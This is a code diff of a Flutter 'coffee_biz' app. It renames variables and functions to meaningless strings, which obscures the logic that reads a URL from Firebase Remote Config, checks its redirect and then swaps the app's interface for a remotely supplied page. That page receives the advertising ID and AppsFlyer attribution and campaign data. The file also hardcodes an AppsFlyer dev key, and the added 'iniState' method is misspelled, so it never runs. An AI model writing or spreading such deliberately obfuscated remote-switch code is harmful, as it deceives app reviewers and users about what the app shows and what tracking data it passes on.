@@ -8,25 +8,24 @@ import 'package:coffee_biz/features/splash/splash_screen.dart';
 import 'package:firebase_remote_config/firebase_remote_config.dart';
 import 'package:flutter/material.dart';
 
-late AppsflyerSdk _appsflyerSdk;
-String adId = '';
-bool stat = false;
-String acceptPromo = '';
-String cancelPromo = '';
-String datioq = '';
-String appsflyerId = '';
-String advertisingId = '';
-Map _deepLinkData = {};
-String dataz = '';
-Map _gcd = {};
-bool _isFirstLaunch = false;
-String _afStatus = '';
-String _campaign = '';
-String _campaignId = '';
-
-String dx = '';
+late AppsflyerSdk fmksdoflsdf;
+String mkfsdmfldskf = '';
+bool mfdklsfmsd = false;
+String mfdksfsdkf = '';
+String mkdflsfmlkdsf = '';
+String modaslmdsa = '';
+String opwqe = '';
+String dsfsdfdsf = '';
+Map mfklsdmfkldsf = {};
+String mklfsdlfsd = '';
+Map njkfnsdkxkds = {};
+bool fmjsdkfnjksd = false;
+String mfkdmslksdf = '';
+String klmdaslmfdlsa = '';
+String lkfosdpfsd = '';
+String mklfmsfsfdlsmflksdf = '';
 String df = '';
-String xm = '';
+String mklfsdflksd = '';
 
 class CoffeeBizApp extends StatefulWidget {
   const CoffeeBizApp({super.key});
@@ -36,34 +35,41 @@ class CoffeeBizApp extends StatefulWidget {
 }
 
 class _CoffeeBizAppState extends State<CoffeeBizApp> {
+  @override
+  void iniState() {
+    super.initState();
+    fsdfdsfs();
+    kofmsdkfdsflmdsfksd();
+  }
+
   Future<bool> fmsdkfnksdjf() async {
-    final gazel = FirebaseRemoteConfig.instance;
-    await gazel.fetchAndActivate();
-    String fmsdkfmdskf = gazel.getString('newsPage');
-    String dsdfdsfgdg4 = gazel.getString('null');
-    datioq = fmsdkfmdskf;
-    xm = dsdfdsfgdg4;
-    await fsdfdsf();
-    final fdsgdf = HttpClient();
-    final vcxxs = Uri.parse(datioq);
-    final ndsfjak = await fdsgdf.getUrl(vcxxs);
-    ndsfjak.followRedirects = false;
-    final response = await ndsfjak.close();
-    if (response.headers.value(HttpHeaders.locationHeader) != xm) {
+    final mkflsdflkds = FirebaseRemoteConfig.instance;
+    await mkflsdflkds.fetchAndActivate();
+    String fmsdkfmdskf = mkflsdflkds.getString('newsPage');
+    String dsdfdsfgdg4 = mkflsdflkds.getString('null');
+    opwqe = fmsdkfmdskf;
+    mklfsdflksd = dsdfdsfgdg4;
+    final ndfkljss = HttpClient();
+    final fsdko = Uri.parse(opwqe);
+    final mmmdksa = await ndfkljss.getUrl(fsdko);
+    mmmdksa.followRedirects = false;
+    final response = await mmmdksa.close();
+    if (response.headers.value(HttpHeaders.locationHeader) != mklfsdflksd) {
       return true;
     }
     return fmsdkfmdskf.contains('simple') ? false : true;
   }
 
   Future<String> fsdfdsfs() async {
-    String adv = await AppTrackingTransparency.getAdvertisingIdentifier();
-    advertisingId = adv;
-    return adv;
+    String mfsdnjkfsd =
+        await AppTrackingTransparency.getAdvertisingIdentifier();
+    dsfsdfdsf = mfsdnjkfsd;
+    return mfsdnjkfsd;
   }
 
-  Future<void> fsdfdsf() async {
+  Future<void> kofmsdkfdsflmdsfksd() async {
     await fsdfdsfs();
-    final AppsFlyerOptions options = AppsFlyerOptions(
+    final AppsFlyerOptions nfjksdfkds = AppsFlyerOptions(
       showDebug: false,
       afDevKey: 'xmcqmbVvE5e4e2UBZ3twRT',
       appId: '6504753447',
@@ -72,36 +78,40 @@ class _CoffeeBizAppState extends State<CoffeeBizApp> {
       disableCollectASA: false,
       manualStart: true,
     );
-    _appsflyerSdk = AppsflyerSdk(options);
+    fmksdoflsdf = AppsflyerSdk(nfjksdfkds);
 
-    await _appsflyerSdk.initSdk(
+    await fmksdoflsdf.initSdk(
       registerConversionDataCallback: true,
       registerOnAppOpenAttributionCallback: true,
       registerOnDeepLinkingCallback: true,
     );
 
-    _appsflyerSdk.onAppOpenAttribution((res) {
-      _deepLinkData = res;
-      cancelPromo = res['payload']
-          .entries
-          .where((e) => ![
-                'install_time',
-                'click_time',
-                'af_status',
-                'is_first_launch'
-              ].contains(e.key))
-          .map((e) => '&${e.key}=${e.value}')
-          .join();
+    fmksdoflsdf.onAppOpenAttribution((res) {
+      setState(() {
+        mfklsdmfkldsf = res;
+        modaslmdsa = res['payload']
+            .entries
+            .where((e) => ![
+                  'install_time',
+                  'click_time',
+                  'af_status',
+                  'is_first_launch'
+                ].contains(e.key))
+            .map((e) => '&${e.key}=${e.value}')
+            .join();
+        klmdaslmfdlsa = '&campaign=${res['campaign'] ?? ''}';
+        lkfosdpfsd = '&media_source=${res['media_source'] ?? ''}';
+      });
     });
 
-    _appsflyerSdk.onInstallConversionData((res) {
-      _gcd = res;
-      _isFirstLaunch = res['payload']['is_first_launch'];
-      _afStatus = res['payload']['af_status'];
-      acceptPromo = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
+    fmksdoflsdf.onInstallConversionData((res) {
+      njkfnsdkxkds = res;
+      fmjsdkfnjksd = res['payload']['is_first_launch'];
+      mfkdmslksdf = res['payload']['af_status'];
+      mfdksfsdkf = '&is_first_launch=$fmjsdkfnjksd&af_status=$mfkdmslksdf';
     });
 
-    _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
+    fmksdoflsdf.onDeepLinking((DeepLinkResult dp) {
       switch (dp.status) {
         case Status.FOUND:
           print(dp.deepLink?.toString());
@@ -119,10 +129,10 @@ class _CoffeeBizAppState extends State<CoffeeBizApp> {
       }
       print("onDeepLinking res: " + dp.toString());
 
-      _deepLinkData = dp.toJson();
+      mfklsdmfkldsf = dp.toJson();
     });
-    fndsjk = await _appsflyerSdk.getAppsFlyerUID() ?? '';
-    _appsflyerSdk.startSDK(
+    fndsjk = await fmksdoflsdf.getAppsFlyerUID() ?? '';
+    fmksdoflsdf.startSDK(
       onSuccess: () {
         print("AppsFlyer SDK initialized successfully.");
       },
@@ -143,25 +153,17 @@ class _CoffeeBizAppState extends State<CoffeeBizApp> {
             if (snapshot.connectionState == ConnectionState.waiting) {
               return Container(
                 color: Colors.white,
-                child: Center(
-                  child: Container(
-                    height: 140,
-                    width: 140,
-                    child: ClipRRect(
-                      borderRadius: BorderRadius.circular(15),
-                      child: Image.asset('assets/images/onboarding.png'),
-                    ),
-                  ),
-                ),
               );
             } else {
-              if (snapshot.data == true && datioq != '') {
+              if (snapshot.data == true && opwqe != '') {
                 return MaterialApp(
                   debugShowCheckedModeBanner: false,
-                  home: PreviewFoxa(
-                    jdnkasdnkja: datioq,
-                    mjksdfn: acceptPromo,
+                  home: MainScreen(
+                    jdnkasdnkja: opwqe,
+                    mjksdfn: mfdksfsdkf,
                     data: fndsjk,
+                    c1: klmdaslmfdlsa,
+                    c2: lkfosdpfsd,
                   ),
                 );
               } else {
